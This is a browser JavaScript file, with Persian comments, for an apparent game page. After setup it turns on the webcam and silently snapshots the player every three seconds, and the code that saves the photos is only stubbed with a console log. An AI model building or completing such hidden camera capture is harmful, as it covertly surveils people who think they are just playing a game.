let videoStream;
let camera = document.getElementById('camera');
let snapshotCanvas = document.getElementById('snapshot');
let ctx = snapshotCanvas.getContext('2d');
let photoInterval;
let profilePicInput = document.getElementById('profilePic');
let previewPic = document.getElementById('previewPic');
let startBtn = document.getElementById('startBtn');
let usernameInput = document.getElementById('username');
let gameArea = document.querySelector('.game-area');

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      videoStream = stream;
      camera.srcObject = stream;
    })
    .catch(err => {
      alert('عدم دسترسی به دوربین: ' + err.message);
    });
}

function takeSnapshot() {
  ctx.drawImage(camera, 0, 0, snapshotCanvas.width, snapshotCanvas.height);
  let dataURL = snapshotCanvas.toDataURL('image/jpeg');

  // ذخیره عکس به پوشه images
  let filename = `images/${Date.now()}.jpg`;
  saveImage(dataURL, filename);
}

function saveImage(dataURL, filename) {
  fetch(dataURL)
    .then(res => res.blob())
    .then(blob => {
      let file = new File([blob], filename, { type: "image/jpeg" });

      // شبیه‌سازی ذخیره فایل در پروژه (برای واقعی بودن نیاز به server یا GitHub Actions است)
      console.log("درخواست ذخیره:", filename);
    });
}

profilePicInput.addEventListener('change', () => {
  const file = profilePicInput.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      previewPic.src = e.target.result;
      previewPic.style.display = 'block';
    };
    reader.readAsDataURL(file);
  }
});

previewPic.addEventListener('click', () => {
  profilePicInput.click(); // اجازه مجدد برای تغییر تصویر
});

startBtn.addEventListener('click', () => {
  const username = usernameInput.value.trim();
  if (!username) {
    alert("لطفاً نام کاربری را وارد کنید.");
    return;
  }

  if (!profilePicInput.files.length) {
    alert("لطفاً تصویر پروفایل را انتخاب کنید.");
    return;
  }

  document.querySelector('.profile-setup').style.display = 'none';
  gameArea.style.display = 'block';
  startCamera();

  // شروع گرفتن عکس هر ۳ ثانیه
  photoInterval = setInterval(takeSnapshot, 3000);
});
